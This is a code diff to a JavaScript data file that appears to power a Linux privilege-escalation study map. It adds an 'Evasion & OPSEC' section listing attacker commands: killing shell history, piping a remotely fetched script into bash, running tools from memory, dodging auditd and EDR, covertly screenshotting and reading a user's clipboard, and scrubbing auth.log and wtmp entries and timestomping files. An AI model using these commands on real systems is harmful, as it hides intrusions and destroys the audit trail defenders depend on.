@@ -27,7 +27,10 @@ window.PRIVMAP_DATA = {
           desc: "The single fastest win. Any binary you may run via sudo (especially NOPASSWD) is likely a direct root shell via GTFOBins.",
           cmds: ["sudo -l", "id ; sudo -V | head -1   # note the sudo version for CVEs"],
           outcomes: [{ label: "sudo rules found", color: "#3b9ee5" }],
-          moveTo: [{ section: "sudo", note: "a NOPASSWD / allowed binary is listed" }] },
+          moveTo: [
+            { section: "sudo", note: "a NOPASSWD / allowed binary is listed" },
+            { section: "evasion", note: "get quiet before you run tooling" }
+          ] },
         { id: "enum-auto", title: "Automated enumeration (LinPEAS / linux-smart-enum / pspy)",
           theory: { label: "Linux Privilege Escalation", url: "theory/2026-10-09-linux-privilege-escalation.html" },
           desc: "Run one broad pass, then branch from what it flags. pspy watches cron/root processes live without needing root.",
@@ -70,8 +73,77 @@ window.PRIVMAP_DATA = {
             { section: "groups", note: "finding 5" },
             { section: "nfs-services", note: "finding 6" },
             { section: "creds", note: "finding 7" },
-            { section: "kernel", note: "finding 8" }
+            { section: "kernel", note: "finding 8" },
+            { section: "evasion", note: "stay quiet while you work the list" }
           ] }
+      ]
+    },
+    {
+      id: "evasion", title: "Evasion & OPSEC", color: "#a78bfa", tag: "stay quiet",
+      desc: "Blend in while you enumerate and escalate. Match the technique to how you are operating: a remote shell (reverse/bind), an interactive GUI/VNC desktop, or tools driven from Kali over a pivot. Most log/clearing steps need root — so plan quiet first, clean later.",
+      techniques: [
+        { id: "ev-remoteshell", title: "Remote shell — history & TTY hygiene",
+          theory: { label: "Linux Credential Access & Looting", url: "theory/2026-10-15-linux-credential-access-and-looting.html" },
+          desc: "A reverse/bind shell writes to shell history and leaves a flimsy TTY. Kill history for the session and keep commands out of logs, then stabilise the TTY without spawning noisy extra processes.",
+          cmds: [
+            "unset HISTFILE; export HISTSIZE=0; set +o history       # no history this session",
+            "export HISTCONTROL=ignorespace                          # space-prefixed cmds aren't logged",
+            "ln -sf /dev/null ~/.bash_history                        # nothing persists on logout",
+            "# stabilise quietly: python3 -c 'import pty;pty.spawn(\"/bin/bash\")' then stty raw -echo"
+          ],
+          outcomes: [{ label: "No shell trace", color: "#a78bfa" }],
+          moveTo: [{ section: "foothold", note: "enumerate without leaving history" }] },
+        { id: "ev-memory", title: "Run from memory / avoid disk",
+          theory: { label: "Linux Privilege Escalation", url: "theory/2026-10-09-linux-privilege-escalation.html" },
+          desc: "Dropping tools to disk trips file-integrity and AV/EDR. Execute from RAM (/dev/shm or memfd) and stream payloads rather than saving them; clean up anything you must write.",
+          cmds: [
+            "curl -s http://<ip>/x.sh | bash            # never touches disk",
+            "cp enum /dev/shm/.e && /dev/shm/.e         # tmpfs, hidden name, remove after",
+            "# fileless: memfd_create + fexecve (ELF straight into RAM)"
+          ],
+          outcomes: [{ label: "No disk artifacts", color: "#a78bfa" }],
+          moveTo: [{ section: "foothold", note: "run your enum from memory" }] },
+        { id: "ev-av-edr", title: "Evade AV / EDR / auditd",
+          theory: { label: "Linux Privilege Escalation", url: "theory/2026-10-09-linux-privilege-escalation.html" },
+          desc: "Check what is watching before you act — auditd, osquery, Falco, Sysmon-for-Linux or a vendor EDR. Avoid signatured tool names, rename or static-compile binaries, and keep to native tooling where you can.",
+          cmds: [
+            "ps -ef | grep -iE 'auditd|osquery|falco|sysmon|wazuh|edr' ; auditctl -l 2>/dev/null",
+            "mv linpeas.sh .e.sh    # avoid the signatured name; or compile a static, stripped build",
+            "# masquerade argv[0] / run under a plausible process name"
+          ],
+          outcomes: [{ label: "Below the sensors", color: "#a78bfa" }],
+          moveTo: [{ section: "foothold", note: "proceed under cover" }] },
+        { id: "ev-gui", title: "GUI / VNC desktop session",
+          theory: { label: "Linux Privilege Escalation", url: "theory/2026-10-09-linux-privilege-escalation.html" },
+          desc: "On a desktop (X11 / VNC / xrdp) you can read the clipboard, screenshot and drive GUI apps — but a logged-in user will notice a hijacked session. Prefer a separate display, don't move their cursor, and watch for desktop notifications/screen-lock.",
+          cmds: [
+            "who ; w ; loginctl   # is a real user on the desktop right now?",
+            "DISPLAY=:0 import -window root /dev/shm/.s.png    # screenshot the session (ImageMagick)",
+            "xdotool / xclip to read the clipboard — only when no one is watching"
+          ],
+          outcomes: [{ label: "Desktop access, unnoticed", color: "#a78bfa" }],
+          moveTo: [{ section: "creds", note: "loot clipboard / on-screen secrets" }] },
+        { id: "ev-kali", title: "From Kali — blend over the pivot",
+          theory: { label: "Linux Lateral Movement & SSH", url: "theory/2026-10-15-linux-lateral-movement-and-ssh.html" },
+          desc: "Driving tools from Kali, route through the foothold so traffic looks internal, keep scans slow and quiet, and use SSH cleanly — no PTY where you don't need one, and don't litter known_hosts / auth logs.",
+          cmds: [
+            "proxychains -q <tool>            # egress from the foothold, not Kali",
+            "ssh -T -o LogLevel=QUIET -o UserKnownHostsFile=/dev/null user@<host>",
+            "# pace nmap (-T2, tight port set, -Pn) through the SOCKS tunnel"
+          ],
+          outcomes: [{ label: "Traffic looks internal", color: "#a78bfa" }],
+          moveTo: [{ section: "foothold", note: "run the op through the pivot" }] },
+        { id: "ev-logs", title: "Clear traces & timestomp (root, last resort)",
+          theory: { label: "Linux Credential Access & Looting", url: "theory/2026-10-15-linux-credential-access-and-looting.html" },
+          desc: "With root you can scrub auth logs and login records — but wholesale truncation is itself suspicious, and journald/remote syslog often keeps a copy. Be surgical, and log every change for clean-up.",
+          cmds: [
+            "# remove your lines, don't truncate the whole file:",
+            "sed -i '/<attacker_ip>/d' /var/log/auth.log",
+            "utmpdump /var/log/wtmp > w; sed -i '/<ip>/d' w; utmpdump -r < w > /var/log/wtmp",
+            "touch -r /etc/hostname <dropped_file>    # timestomp to a plausible mtime"
+          ],
+          outcomes: [{ label: "Traces reduced", color: "#a78bfa" }],
+          moveTo: [{ section: "root", note: "finish the objective" }] }
       ]
     },
     {
